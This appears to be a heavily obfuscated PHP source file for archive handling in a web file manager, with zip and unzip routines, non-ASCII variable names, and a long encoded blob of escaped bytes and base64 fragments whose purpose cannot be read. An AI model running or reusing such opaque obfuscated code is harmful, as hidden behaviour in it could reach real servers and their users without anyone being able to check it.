246\207\364\321\202\166\371\365\111\326\146\305\333\111\137\372\12\223\117\162\236\107\134\2\261\307\340".base64_decode('TMJ+AG1M4yIxlXrAE00gxtiaKMl3d8FMkE8x/cBeBMPswggHBCOAs0NtuDnKHiKu').base64_decode('F4u7GMvA9EARnoB5dt1de96T8qrMuh5wr2iDPF1A0/rxcFDOATE4FOIPkYii3pQq')."\x1d\x40\xc9\x8a\x90\x26\xf1\xc\x4a\xb3\xd2\x40\x9f\x36\xe3\x4f\x4b\x28\xb\x98\x21\xb5\x68\x80\xf8\xd7\xa\x17\x4a\x8e\x8b\x75\xee\x92\x75\xe3\xa5\xb5\xa1\x11\x84\xd2\x11\xac\x11\xd6\x2a\x32"."\13\23\25\21\56\21\122\224\365\213\253\45\342\207\65\212\131\123\236\77\202\220\261\241\3\175\240\220\362\350\76\304\333\350\116\345\373\104\264\370\377\227\202\64\61\41\51\153"."\272\53\251\354\220\355\75\352\4\331\205\237\136\312\231\143\356\127\12\161\214\367\261\45\327\63\113\322\246\41\366\276\362\303\120\356\102\276\212\7\116\24\362\374\254\202\100\35"."\126\21\73\211\142\74\40\311\54\65\75\205\376\244\340\227\35\147\336\116\120\104\5\115\326\163\240\152\317\31\371\214\305\325\144\104\104\267\56\30\163\122\12\153\212\150\354\231"."\135\362\146\133\7\303\311\360\246\112\265\347\270\260\257\74\367\43\61\342\355\35\161\166\272\137\47\341\227\275\266\330\14\266\343\172\375\46\151\46\265\41\37\245\310\60\126\23".strrev('æ]ªqòÔŞPô¹Oã;H¶¼êŠ6Eä|eŞ`e"İëá–xL‰@£%•V[ù	¶¡').base64_decode('MouxEDfFNUhd2WhUUCuVxFWUfGSivy67REjrS3apxLpepTfWCQFz0iUWjYQLrXIx')."\x42\xe5\xff\xae\x58\x4b\xe2\xf3\x64\x35\x67\x7a\x75\x27\xc\xe0\x20\x3b\xea\x67\x2f\xbd\xab\x83\x9\x93\xab\x64\xf7\xa7\x5c\x18\xdd\x29\x3d\xc7\x1e\xac\xbc\x6f\xc5\x7a\x73\x80\x51\x64\x35\x53"."\xb8\xf0\xe\xc8\x8c\x18\x64\x50\x16\x28\x2\x34\x5c\x1b\x19\x83\x12\xa2\x86\x7d\xe4\x83\x60\xa\x99\x70\xff\x82\x58\xe\xc1\xee\x7\x81\x28\xa8\x93\x9f\xe\x3d\xcb\xb9\x18\x1c\x16\xa7\xb9\xec"."\22\104\150\132\170\337\264\143\315\360\47\371\174\164\144\342\51\126\372\0\237\217\77\266\347\243\56\31\175\360\304\236\117\30\62\176\321\233\102\302\334\316\375\64\63\356\63\327"."\xc3\xac\x60\x27\xbc\x9c\x4\x9f\x2a\x4f\x81\xb8\x77\xe2\x92\x66\xa5\x8c\x55\xdc\x32\x17\xcb\x5\x71\x5b\x8f\x2\x6e\xce\xaa\x62\xc0\xd2\x8\xcb\x56\xde\x47\xee\xd8\x7d\xcc\x51\x9e\x67\x3a\xc4".strrev('bÉæ³Æ™'."\n".'+í@­:‡ÂéjApÍ›ÒìZš¯ÆRì%ÇU^_‡2©•ä¨')."\11\261\76\342\122\17\74\12\300\45\44\320\31\142\305\25\67\74\51\314\53\251\274\157\111\242\133\123\272\362\55\114\17\356\376\337\101\276\240\373\151\126\111\157\271\362\115\341".strrev('–;r–ã¹3Bô	Ø–\'Hq•¢Ûº`/ğô>Ø¶:ÄÃeG™GHôi(@ Š')."\346\146\5\253\161\74\144\46\30\173\145\220\167\302\165\157\337\311\304\200\34\104\44\113\54\221\134\243\143\172\205\70\270\70\76\321\210\14\61\126\314\303\201\213\15\264\305\236"."\x92\x50\xca\xff\x62\x1\x19\x77\x43\x19\x21\xa1\xb0\x53\x65\xe4\xc1\x85\xc\x6f\x54\x79\x80\x52\xd2\x7f\xf8\x82\x7e\x53\xba\x8c\x73\x72\x7e\xcd\xf1\x4b\x0\x29\x9\xfe\x74\x27\x46\x16\x18\xe8".base64_decode('FsFwusfqqR4VE3UM+JTdZaokzqR3KoULL4ksw6WZseZu+HWGnOQXOJ2cYDzoDnXt')."\x56\xc9\xd7\xaf\x6c\xc1\x46\x2a\x92\xb7\x41\x65\xd5\xd2\x83\x84\x42\x84\x43\x64\x3e\x30\x8\xd8\xc3\xc4\x33\x29\xb1\x62\xc\x2d\xe2\x96\x8d\x9a\xa4\x64\xe5\x96\x2b\xe1\xd9\x95\xde\xa0\x35\xe5"."\x6f\x31\xeb\x18\x9f\xc7\x98\xaf\x55\xd4\xba\x8b\x2f\x44\xe1\xe\xcf\xfb\xc4\x4\x2b\x79\x1f\x2d\x66\x53\x44\x50\x81\xc0\x72\x92\x81\xac\x8b\x9\xe1\x8f\xb6\xb9\x98\x12\xdb\xfb\x2e\x23\x22\xcd"."\x64\x2f\xc8\x28\xc8\x37\x1\x1c\xa7\x80\xe\x89\x66\x3b\x6d\x4d\x3a\x2d\xc5\xc1\x28\xbe\x7a\xca\x5\x11\x90\x84\xb1\x84\xff\xe1\x89\x2e\x3b\x62\xec\x8a\xca\xb3\xf3\x99\x75\xb2\xed\x79\xa5\x95"."\172\262\245\337\214\114\377\377\375\20\341\377\255\367\7\147\65\60\261\271\353\225\343\105\100\54\63\372\154\215\344\3\233\212\154\75\343\160\37\232\373\3\24\361\7\275\245\60"."\x57\xdf\x65\xee\xc8\x98\x97\x32\x8d\x5d\x15\x69\xf9\xbc\x74\xb4\x56\x67\x2f\x2a\x9e\x87\x45\xc0\x37\xcc\xdf\x16\xad\x16\xf0\x9a\xcd\x79\x9f\x8a\xed\x67\x8f\xae\x93\x57\x60\x7\xaa\x65\x14\x98".base64_decode('h3MxVeCYRjHitVh5s4vXK+r2IC0RGRXZRKuIFmGe3YLsK40ZNuJlAeZLtpeNlRhr').base64_decode('Vw+YfWAhQ0fE+h6wkoyJXFEV+CvpWgVXpDzBsGrY3JgtoKtEt+epS5rJlmfTJVyv')."\274\350\257\54\315\167\276\134\4\353\111\273\345\115\374\171\363\6\357\173\347\323\375\225\215\121\63\5\54\362\210\143\41\3\23\33\221\373\27\162\361\131\245\14\205\324\204\310"."\xb3\x9b\xbd\x52\x7d\xc7\xf2\x27\x46\x85\xc\xd\x7f\xc9\xe3\x65\x3b\xbf\xd7\x32\x9\x41\xe7\x8e\xe5\x82\x17\x49\x41\x55\x7a\x80\x7b\x4a\xa0\xe2\x7c\x61\xd8\xce\x35\xe5\x88\xcb\x12\x17\x7c\x86"."\111\334\310\263\242\175\335\165\304\342\6\40\26\61\11\235\246\130\173\351\165\153\274\247\204\27\111\354\363\213\310\372\344\123\233\31\301\111\72\344\20\345\222\310\331\362\113\42"."\356\222\330\52\300\275\227\132\252\145\113\233\226\55\145\343\361\325\362\142\10\223\45\16\162\32\176\211\330\161\255\205\170\21\300\373\22\0\341\303\51\153\355\342\260\341\16\126"."\216\222\256\50\21\261\235\161\77\171\102\22\111\64\163\70\12\65\110\227\154\356\73\116\356\51\275\2\123\226\215\250\224\114\112\61\77\166\350\27\33\12\106\204\167\12\222\114"."\257\17\102\322\43\327\336\122\356\307\321\245\33\321\64\201\274\160\345\245\227\270\213\223\350\14\126\14\163\102\342\10\360\304\127\173\336\73\253\215\12\42\111\320\342\231\114\247"."\66\132\45\153\206\161\43\74\26\305\360\254\204\310\222\154\221\205\32\273\76\346\175\357\70\40\333\57\273\62\126\306\12\133\145\251\274\270\376\20\303\304\161\325\206\117\66\232"."\273\270\154\13\315\201\112\104\321\307\41\270\276\224\304\367\140\323\14\241\110\105\207\302\231\170\321\244\333\362\232\147\343\153\206\362\20\103\30\277\53\326\303\311\141\221\10\243"."\x18\x3c\x49\x20\x41\x90\xaa\xaf\x2a\x68\x90\x40\x40\xcf\x47\xa5\xea\xe4\x4b\xd0\xdd\x16\x48\x54\x6f\x44\x40\xa5\x7b\x8a\x25\x93\x75\x91\xc0\x8e\x3a\xd3\x35\xf9\x12\x8a\xe4\x3\x83\x9c\x71\x39"."\321\325\35\357\322\22\46\104\200\57\215\54\20\1\54\115\13\271\223\150\176\335\323\173\271\200\167\144\264\204\75\146\70\351\234\304\31\125\46\126\306\133\25\223\12\15\125\357"."\257\267\127\154\116\275\374\242\250\244\242\77\222\46\105\322\254\122\206\366\250\152\61\232\204\113\12\162\325\125\166\67\123\200\313\322\44\134\266\42\231\25\226\304\53\122\71\107"."\x2b\xdb\xbb\x19\x5e\xe5\xe4\x81\xcc\x21\x53\x65\xc0\x1e\xce\x9c\x66\xdd\xdd\x7c\x56\xcd\x5c\xd9\x1c\x40\x9c\x37\x37\x11\x52\x54\xef\x85\x90\x2d\x78\x6e\xb4\xab\xf5\xa2\x6a\xe6\xdd\xf6\x42\xe4"."\366\234\2\325\160\55\113\251\202\135\205\152\103\45\36\27\151\125\24\55\150\235\370\214\226\335\127\125\111\226\265\66\252\353\165\304\253\156\175\333\255\160\341\211\227\47\6\334"."\xa0\x2\x75\x5\xd0\x86\x38\xc5\xbc\xc1\xde\xca\x94\x34\xc9\xa7\xb8\xf0\x7b\xb9\x38\x5c\x34\xf9\x99\x91\x11\xfa\x81\x58\xb7\x39\x64\x79\x27\xb2\xa2\x36\x37\x9c\x16\xcb\x92\x67\xd9\xaa\x8a\xed"."\x3e\xcc\xd7\x57\x72\xd0\x79\x8d\xc9\xec\x25\x8b\x0\xca\xf2\x98\x8e\x91\xd6\xdd\xee\x6b\x65\x2f\x56\x34\x9d\x35\x92\x97\x64\x83\x1e\xb1\x9c\x90\x32\xb8\x14\x2\xaa\x8\xae\x48\x14\xd0\x75\x42"."\374\115\353\223\50\26\1\23\56\113\14\112\47\300\225\0\275\115\154\307\267\326\374\36\211\270\136\245\347\52\115\116\230\226\343\303\151\111\263\104\176\333\114\307\21\267\353\224"."\255\47\304\40\76\34\175\222\362\10\372\22\227\106\270\123\344\66\202\200\55\101\57\344\23\356\65\61\277\234\320\151\52\101\112\256\0\276\345\340\1\371\354\203\373\315\316\262"."\xe7\x6\x56\x44\x20\xe6\x74\xd0\x1c\x67\x8e\x2d\xb1\x71\xb7\xe8\xf\xbe\x98\x90\xa6\x4c\xd0\x27\x0\x7e\xb2\xfa\xb\x31\x9b\xb7\x83\x34\x25\x8\xf\x22\xf8\x35\x4c\x28\xc2\x83\x65\x81\xd5\xa5"."\x21\x57\x71\xfa\xec\x13\x57\xb\xfd\xa2\x1a\x40\x8a\x2a\xaa\xa0\xde\xd0\x89\xac\xb\x4c\x66\x12\xc9\x44\x45\x52\x6f\x28\x91\x58\x16\x8b\x77\x50\xe7\xe9\x15\xc9\xa4\x94\xa4\x4e\x54\x91\xd4\xdb"."\25\353\331\135\132\270\73\24\211\126\244\141\315\243\36\125\70\36\243\111\221\136\322\113\162\175\267\273\136\104\332\227\210\236\220\213\142\41\234\57\345\114\46\163\147\227\27\11"."\x2d\xcf\xb8\x74\xc9\xfe\x53\x2f\x8\x8f\x73\xa2\x4c\xd1\x48\xf\xb\xe1\x9e\x26\x11\xef\x36\x73\xd\xc9\x3f\xdc\x2f\x11\x79\x14\xfc\x18\x90\x42\x45\x58\x6b\xa8\x7\xea\x8e\x97\x20\x16\x3b\x93"."\xe7\x7b\x9d\x13\xd2\xe2\xe6\x3b\xe0\xba\x21\x97\xe2\xc9\x7e\x20\x8\x46\x82\x39\xf9\xa0\x25\x11\x53\xab\x4e\x90\x2c\xd8\xad\xbc\x68\x20\xa9\x62\x2\x70\xc7\x16\x9b\xa0\x72\xb6\xda\x1c\x94\x2e"."\x12\x28\x1b\x3\xd6\x98\x30\xa5\x92\x66\x18\xfd\x76\x25\x3b\xda\x50\xd5\x8b\x62\x2a\xcd\xc3\x3b\x5e\xc8\xd9\xfe\xf\x32\x76\x59\x28\x35\xab\x0\x0"."".base64_decode(''), 10, -8))); goto b·åëî¿ÕÈ; e ›ê•ì: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $í”®°Š; if ($í”®°Š) { return $í”®°Š; } $ØÜÓœ› = IO::init($_SERVER[ĞÂ¤àÓï][8]); return $ØÜÓœ›; } private static function iconvSystem($šˆïä÷å) { return self::local()->iconvSystem($šˆïä÷å); } private static function iconvApp($áĞ€ï¼Ğ) { return self::local()->iconvApp($áĞ€ï¼Ğ); } public static function zipFolder($¨¤ò‡í˜, $Ÿ’ªáñÀ = "\172\x69\160", $âğ†ËË = '', $óæœÔØ = REPEAT_RENAME) { $„¥ÈÑĞï =& $_SERVER[ĞÂ¤àÓï]; $¡îÔ‰ûÊ = IO::listPath($¨¤ò‡í˜); if (!$¡îÔ‰ûÊ) { return !1; } $¡îÔ‰ûÊ = array_merge($¡îÔ‰ûÊ[$„¥ÈÑĞï[82]], $¡îÔ‰ûÊ[$„¥ÈÑĞï[83]]); return self::zip($¡îÔ‰ûÊ, $Ÿ’ªáñÀ, $âğ†ËË, $óæœÔØ); } public static function zip($õ¤…²¤°, $Ö°œÜí½ = "\x7a\x69\160", $®­İöó‰ = '', $¸Ä€®·÷ = REPEAT_RENAME) { $øœæˆÛ¡ =& $_SERVER[ĞÂ¤àÓï]; if (is_string($õ¤…²¤°) && $õ¤…²¤°) { $õ¤…²¤° = array(array($øœæˆÛ¡[84] => $õ¤…²¤°)); } $›ƒ…²şä = self::init($õ¤…²¤°[0][$øœæˆÛ¡[84]]); $úÖÅšáæ = self::info($õ¤…²¤°[0][$øœæˆÛ¡[84]]); $±ò“æƒÄ = $øœæˆÛ¡[12]; $¥ìÉÀßË = $øœæˆÛ¡[12]; $õ‚°Êµ = $øœæˆÛ¡[12]; if ($®­İöó‰) { $¥ìÉÀßË = get_path_father($®­İöó‰); $õ‚°Êµ = get_path_this($®­İöó‰); } else { $¥ìÉÀßË = self::pathFather($úÖÅšáæ[$øœæˆÛ¡[84]]); $õ‚°Êµ = $úÖÅšáæ[$øœæˆÛ¡[32]] . $øœæˆÛ¡[10] . $Ö°œÜí½; if (count($õ¤…²¤°) > 1) { $™Ùæº’  = IO::info($¥ìÉÀßË); $õ‚°Êµ = $™Ùæº’ [$øœæˆÛ¡[32]] . $øœæˆÛ¡[10] . $Ö°œÜí½; } } if ($›ƒ…²şä->getType() == $øœæˆÛ¡[106]) { $ÌáÈç­ = self::init($¥ìÉÀßË); $ğİÆøó = $ÌáÈç­->getType() == $øœæˆÛ¡[106] ? $¥ìÉÀßË : get_path_father($›ƒ…²şä->path); $ğİÆøó = rtrim($ğİÆøó, $øœæˆÛ¡[8]) . $øœæˆÛ¡[8]; mk_dir($ğİÆøó); } else { $±ò“æƒÄ = TEMP_FILES . $øœæˆÛ¡[1184] . time() . rand_string(8) . $øœæˆÛ¡[8]; mk_dir($±ò“æƒÄ); file_put_contents($±ò“æƒÄ . $øœæˆÛ¡[1185], $øœæˆÛ¡[12]); $ğİÆøó = $±ò“æƒÄ; } $†ŞÉÔı = IO::info($ğİÆøó); if (!$†ŞÉÔı || !$†ŞÉÔı[$øœæˆÛ¡[202]]) { show_json(LNG($øœæˆÛ¡[1186]), !1); } $Ú³‰° = self::zipFileList($õ¤…²¤°, $±ò“æƒÄ); foreach ($Ú³‰° as $ııĞ´±Ñ => $šù©Ÿà¾) { $Ú³‰°[$ııĞ´±Ñ] = self::iconvSystem($šù©Ÿà¾); } $û¶¹úíÚ = get_filename_auto($ğİÆøó . $õ‚°Êµ, $øœæˆÛ¡[12], $¸Ä€®·÷); KodArchive::create(self::iconvSystem($û¶¹úíÚ), $Ú³‰°); if (!IO::exist($û¶¹úíÚ)) { if ($±ò“æƒÄ) { del_dir($±ò“æƒÄ); } show_json(LNG($øœæˆÛ¡[1187]), !1); } if (!$±ò“æƒÄ) { return $û¶¹úíÚ; } $ÎíÉ¨“° = self::move($û¶¹úíÚ, $¥ìÉÀßË, $¸Ä€®·÷); if ($±ò“æƒÄ) { del_dir($±ò“æƒÄ); } if (!$û¶¹úíÚ) { show_json(LNG($øœæˆÛ¡[1187]), !1); } return $ÎíÉ¨“°; } public static function unzip($ÕÆ«‰², $³›•ŞàÌ, $ú˜¬©©– = "\55\x31", $À™øÓé‡ = "\162\145\160\x6c\x61\143\145") { $ÃŞ†âéÚ =& $_SERVER[ĞÂ¤àÓï]; $¨—˜áÏ» = parent::info($ÕÆ«‰²); if (!$¨—˜áÏ») { show_json(LNG($ÃŞ†âéÚ[1188]), !1); } $×ßö² = IO::infoFull($³›•ŞàÌ); if (!$×ßö²) { $³›•ŞàÌ = IO::mkdir($³›•ŞàÌ); } if (isset($×ßö²[$ÃŞ†âéÚ[402]]) && trim($×ßö²[$ÃŞ†âéÚ[84]], $ÃŞ†âéÚ[8]) != trim($³›•ŞàÌ, $ÃŞ†âéÚ[8])) { $Ñ—õÔéÍ = KodIO::make($×ßö²[$ÃŞ†âéÚ[432]]); $˜ã¨¯Â£ = IO::fileNameAuto($Ñ—õÔéÍ, $×ßö²[$ÃŞ†âéÚ[32]], REPEAT_RENAME_FOLDER, !0); $³›•ŞàÌ = IO::mkdir($Ñ—õÔéÍ . $˜ã¨¯Â£); } $ú˜¬©©– = $ú˜¬©©– && $ú˜¬©©– != $ÃŞ†âéÚ[1189] ? @json_decode($ú˜¬©©–, !0) : -1; $ÀšŒÉö = self::unzipPart($ÕÆ«‰², $ú˜¬©©–); if (!$ÀšŒÉö || !IO::exist($ÀšŒÉö[$ÃŞ†âéÚ[199]])) { show_json(LNG($ÃŞ†âéÚ[105]), !1); } $ÊÆ¸Éœ = $ÀšŒÉö[$ÃŞ†âéÚ[1190]][count($ÀšŒÉö[$ÃŞ†âéÚ[1190]]) - 1]; if ($ÊÆ¸Éœ[$ÃŞ†âéÚ[1191]] == -1 || substr($ÊÆ¸Éœ[$ÃŞ†âéÚ[32]], -1, 1) == $ÃŞ†âéÚ[8]) { $›úÚğ™ = $ÀšŒÉö[$ÃŞ†âéÚ[1192]] . rand_string(10) . $ÃŞ†âéÚ[8]; mk_dir($›úÚğ™); $¸™ïòø¨ = count($ÀšŒÉö[$ÃŞ†âéÚ[1190]]) == 1 ? IO::ext($ÕÆ«‰²) : get_path_ext($ÀšŒÉö[$ÃŞ†âéÚ[199]]); $Úá¤°¶Œ = KodArchive::extract(self::iconvSystem($ÀšŒÉö[$ÃŞ†âéÚ[199]]), $›úÚğ™, $ÊÆ¸Éœ[$ÃŞ†âéÚ[1191]], $˜ã¨¯Â£, $¸™ïòø¨); self::unzipErrorCheck($Úá¤°¶Œ, array($ÃŞ†âéÚ[1193], $ÕÆ«‰², $¸™ïòø¨, $³›•ŞàÌ, $ÀšŒÉö)); Hook::trigger($ÃŞ†âéÚ[1194], $›úÚğ™); recursion_dir($›úÚğ™, $µ¶à…«, $Ñˆ›³†¨, 0); $´Í™¤‡Š = array_merge($µ¶à…«, $Ñˆ›³†¨); $ÙñÕ = array(); foreach ($´Í™¤‡Š as $ÚÓÌì»Ÿ) { $µ¾­×­ = IO::move(self::iconvApp($ÚÓÌì»Ÿ), $³›•ŞàÌ, $À™øÓé‡); if ($µ¾­×­) { $ÙñÕ[] = $µ¾­×­; } } del_dir($›úÚğ™); } else { $µ¾­×­ = IO::move($ÀšŒÉö[$ÃŞ†âéÚ[199]], $³›•ŞàÌ, $À™øÓé‡, get_path_this($ÊÆ¸Éœ[$ÃŞ†âéÚ[32]])); if ($µ¾­×­) { $ÙñÕ[] = $µ¾­×­; } } return $ÙñÕ ? $ÙñÕ : !1; } public static function unzipList($ˆÚú¯ÁÄ) { $ğ™õ¤ëë =& $_SERVER[ĞÂ¤àÓï]; $¶Ê¬º ‚ = isset($ˆÚú¯ÁÄ[$ğ™õ¤ëë[1195]]) ? $ˆÚú¯ÁÄ[$ğ™õ¤ëë[1195]] : !1; $Ãì­…½í = isset($ˆÚú¯ÁÄ[$ğ™õ¤ëë[1191]]) ? @json_decode($ˆÚú¯ÁÄ[$ğ™õ¤ëë[1191]], !0) : -1; $Óçë»³ = self::unzipPart($ˆÚú¯ÁÄ[$ğ™õ¤ëë[84]], $Ãì­…½í); if (!$Óçë»³ || !IO::exist($Óçë»³[$ğ™õ¤ëë[199]])) { show_json(LNG($ğ™õ¤ëë[105]), !1); } $ò‚¡¯†› = $Óçë»³[$ğ™õ¤ëë[1190]][count($Óçë»³[$ğ™õ¤ëë[1190]]) - 1]; $à£ˆ€ş = in_array(IO::ext($Óçë»³[$ğ™õ¤ëë[199]]), array($ğ™õ¤ëë[313], $ğ™õ¤ëë[1196], $ğ™õ¤ëë[1197], $ğ™õ¤ëë[1198], $ğ™õ¤ëë[1199], $ğ™õ¤ëë[1200])); if (!$¶Ê¬º ‚ && ($ò‚¡¯†›[$ğ™õ¤ëë[1191]] == -1 || $à£ˆ€ş)) { $şÁ¦Ğ¨¡ = $Óçë»³[$ğ™õ¤ëë[1192]] . get_path_this($Óçë»³[$ğ™õ¤ëë[199]]) . $ğ™õ¤ëë[1201]; if (!IO::exist($şÁ¦Ğ¨¡)) { $à¯°òË‚ = $ò‚¡¯†›[$ğ™õ¤ëë[1191]] == -1 ? get_path_ext(IO::pathThis($ˆÚú¯ÁÄ[$ğ™õ¤ëë[84]])) : get_path_ext($Óçë»³[$ğ™õ¤ëë[199]]); $ğ•ïæ²Ñ = KodArchive::listContent(self::iconvSystem($Óçë»³[$ğ™õ¤ëë[199]]), !0, $à¯°òË‚); self::unzipErrorCheck($ğ•ïæ²Ñ, array($ğ™õ¤ëë[1202], $ˆÚú¯ÁÄ, $Óçë»³)); @file_put_contents($şÁ¦Ğ¨¡, json_encode($ğ•ïæ²Ñ[$ğ™õ¤ëë[1203]])); } return @json_decode(IO::getContent($şÁ¦Ğ¨¡), !0); } IO::fileOut($Óçë»³[$ğ™õ¤ëë[199]], $¶Ê¬º ‚, get_path_this($ò‚¡¯†›[$ğ™õ¤ëë[32]])); die; } private static function zipFileList($æ‰ô–Ã, $®¸äì•… = false) { $îîë±¬– =& $_SERVER[ĞÂ¤àÓï]; $Ùåßâó = array(); foreach ($æ‰ô–Ã as $ûÏ‹áß) { $£Ü‡˜Ëé = $ûÏ‹áß[$îîë±¬–[84]]; if ($®¸äì•…) { $£Ü‡˜Ëé = self::copy($ûÏ‹áß[$îîë±¬–[84]], $®¸äì•…, $îîë±¬–[825]); } else { $µÑ«¢ = self::init($ûÏ‹áß[$îîë±¬–[84]]); if ($µÑ«¢->getType() == $îîë±¬–[106]) { $£Ü‡˜Ëé = $µÑ«¢->path; } } if ($£Ü‡˜Ëé && self::local()->exist($£Ü‡˜Ëé)) { $Ùåßâó[$ûÏ‹áß[$îîë±¬–[84]]] = $£Ü‡˜Ëé; } } if (!empty($Ùåßâó)) { return array_values($Ùåßâó); } show_json(LNG($îîë±¬–[1166]), !1); } private static function localFilePath($¹á›äÁ™) { $¥•ı¾Ê =& $_SERVER[ĞÂ¤àÓï]; $³‹±ÍŞ = KodIO::parse($¹á›äÁ™); if ($³‹±ÍŞ[$¥•ı¾Ê[33]] == KodIO::KOD_SOURCE) { $õÉü»ÈÑ = Model($¥•ı¾Ê[832])->fileInfoGet(KodIO::sourceID($¹á›äÁ™)); if (!$õÉü»ÈÑ[$¥•ı¾Ê[84]]) { show_json($¥•ı¾Ê[1204], !1); } $¹á›äÁ™ = $õÉü»ÈÑ[$¥•ı¾Ê[84]]; } $Ê¥µ¼ø† = self::init($¹á›äÁ™); if ($Ê¥µ¼ø†->pathParse[$¥•ı¾Ê[1151]]) { $¹á›äÁ™ = $Ê¥µ¼ø†->pathParse[$¥•ı¾Ê[1151]]; $Ê¥µ¼ø† = self::init($¹á›äÁ™); } $Ò¸ÉÚ¿Ñ = $Ê¥µ¼ø†->getType(); if ($Ò¸ÉÚ¿Ñ == $¥•ı¾Ê[106] || $Ò¸ÉÚ¿Ñ == $¥•ı¾Ê[1205]) { if (!$Ê¥µ¼ø†->exist($Ê¥µ¼ø†->path)) { show_json(LNG($¥•ı¾Ê[105]), !1); } return $Ê¥µ¼ø†->path; } return !1; } public static function unzipPart($öô¼œü», $‰„áŞ…é = -1) { $ÙŞ’öß¸ =& $_SERVER[ĞÂ¤àÓï]; $¦®¨“ï‰ = IO::pathThis($öô¼œü»); if (!$‰„áŞ…é || $‰„áŞ…é == -1) { $ÂïÄ™ª¶ = array(array($ÙŞ’öß¸[32] => $¦®¨“ï‰, $ÙŞ’öß¸[1191] => -1)); $ÂïÄ™ª¶[0][$ÙŞ’öß¸[1206]] = $ÂïÄ™ª¶[0][$ÙŞ’öß¸[32]]; } else { if (is_array($‰„áŞ…é)) { $ÂïÄ™ª¶ = $‰„áŞ…é; $ÄŸÏ‹ÌŸ = count($ÂïÄ™ª¶) - 1; for ($‘ÇéâÏ— = 0; $‘ÇéâÏ— <= $ÄŸÏ‹ÌŸ; $‘ÇéâÏ—++) { $ïçûã¿æ = $ÂïÄ™ª¶[$‘ÇéâÏ—]; $üÍ³äÄò = get_path_this($ïçûã¿æ[$ÙŞ’öß¸[32]]) . (checkExtSafe($ïçûã¿æ[$ÙŞ’öß¸[32]]) ? $ÙŞ’öß¸[12] : $ÙŞ’öß¸[1207]); $ÂïÄ™ª¶[$‘ÇéâÏ—][$ÙŞ’öß¸[1206]] = $ÙŞ’öß¸[1208] . intval($ïçûã¿æ[$ÙŞ’öß¸[1191]]) . $ÙŞ’öß¸[386] . $üÍ³äÄò; if ($‘ÇéâÏ— == 0) { continue; } $ÂïÄ™ª¶[$‘ÇéâÏ—][$ÙŞ’öß¸[1206]] = $ÂïÄ™ª¶[$‘ÇéâÏ— - 1][$ÙŞ’öß¸[1206]] . $ÙŞ’öß¸[1209] . $ÂïÄ™ª¶[$‘ÇéâÏ—][$ÙŞ’öß¸[1206]]; } } } if (!is_array($ÂïÄ™ª¶) || count($ÂïÄ™ª¶) == 0) { return !1; } $¹Öí“¹Œ = $ÂïÄ™ª¶[count($ÂïÄ™ª¶) - 1]; if (!IO::exist($öô¼œü»)) { return !1; } $Ó…œ‹óé = TEMP_FILES . $ÙŞ’öß¸[1210] . kodIO::hashPathSafe($öô¼œü») . $ÙŞ’öß¸[8]; $ñŸàÆäğ = $Ó…œ‹óé . $¹Öí“¹Œ[$ÙŞ’öß¸[1206]]; mk_dir($Ó…œ‹óé); file_put_contents(TEMP_FILES . $ÙŞ’öß¸[1185], $ÙŞ’öß¸[12]); if (IO::exist($ñŸàÆäğ)) { return array($ÙŞ’öß¸[199] => $ñŸàÆäğ, $ÙŞ’öß¸[1190] => $ÂïÄ™ª¶, $ÙŞ’öß¸[1192] => $Ó…œ‹óé); } $ÑØ£Ğ¶ = self::localFilePath($öô¼œü»); if (!$ÑØ£Ğ¶) { $ÑØ£Ğ¶ = $Ó…œ‹óé . $ÙŞ’öß¸[1211]; if (!IO::exist($ÑØ£Ğ¶)) { self::copy($öô¼œü», $Ó…œ‹óé, !1, get_path_this($ÑØ£Ğ¶)); } } if (!$ÑØ£Ğ¶ || !IO::exist($ÑØ£Ğ¶)) { return !1; } if ($¹Öí“¹Œ[$ÙŞ’öß¸[1191]] == -1) { return array($ÙŞ’öß¸[199] => $ÑØ£Ğ¶, $ÙŞ’öß¸[1190] => $ÂïÄ™ª¶, $ÙŞ’öß¸[1192] => $Ó…œ‹óé); } $«—éœ·¨ = $ÑØ£Ğ¶; foreach ($ÂïÄ™ª¶ as $‘ÇéâÏ— => $ïçûã¿æ) { if (!$ïçûã¿æ || $ïçûã¿æ[$ÙŞ’öß¸[1191]] == $ÙŞ’öß¸[1189]) { break; } if (substr($ïçûã¿æ[$ÙŞ’öß¸[32]], -1, 1) == $ÙŞ’öß¸[8]) { break; } $ùúÑ„æ = in_array(get_path_ext($ïçûã¿æ[$ÙŞ’öß¸[1206]]), array($ÙŞ’öß¸[313], $ÙŞ’öß¸[1196], $ÙŞ’öß¸[1197], $ÙŞ’öß¸[1198], $ÙŞ’öß¸[1199], $ÙŞ’öß¸[1200])); $íí‰ĞÔß = $‘ÇéâÏ— == count($ÂïÄ™ª¶) - 1 && $ùúÑ„æ; $šÚ”Ñüğ = $Ó…œ‹óé . $ïçûã¿æ[$ÙŞ’öß¸[1206]]; $¦¥•Öİ = $Ó…œ‹óé . get_path_this($ïçûã¿æ[$ÙŞ’öß¸[32]]); if (IO::exist($šÚ”Ñüğ)) { $«—éœ·¨ = $šÚ”Ñüğ; continue; } $™ÁÁ÷¬‘ = $‘ÇéâÏ— == 0 ? get_path_ext($¦®¨“ï‰) : get_path_ext($«—éœ·¨); $Ú¤Ñ”Šı = KodArchive::extract(self::iconvSystem($«—éœ·¨), $Ó…œ‹óé, $ïçûã¿æ[$ÙŞ’öß¸[1191]], $ÈÓƒÈÍç, $™ÁÁ÷¬‘); self::unzipErrorCheck($Ú¤Ñ”Šı, array($ÙŞ’öß¸[1212], $öô¼œü», $ÂïÄ™ª¶, $ïçûã¿æ, $šÚ”Ñüğ)); if (IO::exist($¦¥•Öİ)) { IO::rename($¦¥•Öİ, get_path_this($šÚ”Ñüğ)); } $«—éœ·¨ = $šÚ”Ñüğ; } $ñŸàÆäğ = $«—éœ·¨; return array($ÙŞ’öß¸[199] => $«—éœ·¨, $ÙŞ’öß¸[1190] => $ÂïÄ™ª¶, $ÙŞ’öß¸[1192] => $Ó…œ‹óé); } private static function unzipErrorCheck($ò†Âõ¤±, $ùÖğš¶ = false) { $âîß¿” =& $_SERVER[ĞÂ¤àÓï]; if ($ò†Âõ¤±[$âîß¿”[1213]]) { return !0; } write_log(array($âîß¿”[1214], $ò†Âõ¤±, $ùÖğš¶), $âîß¿”[1215]); show_json($âîß¿”[1216] . json_encode($ò†Âõ¤±[$âîß¿”[1203]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $«Ãœû¢ =& $_SERVER[ĞÂ¤àÓï]; $Øˆ¬ƒİ› = $GLOBALS[$«Ãœû¢[6]][$«Ãœû¢[89]]; if ($Øˆ¬ƒİ›[$«Ãœû¢[1217]] != 1) { return; } if 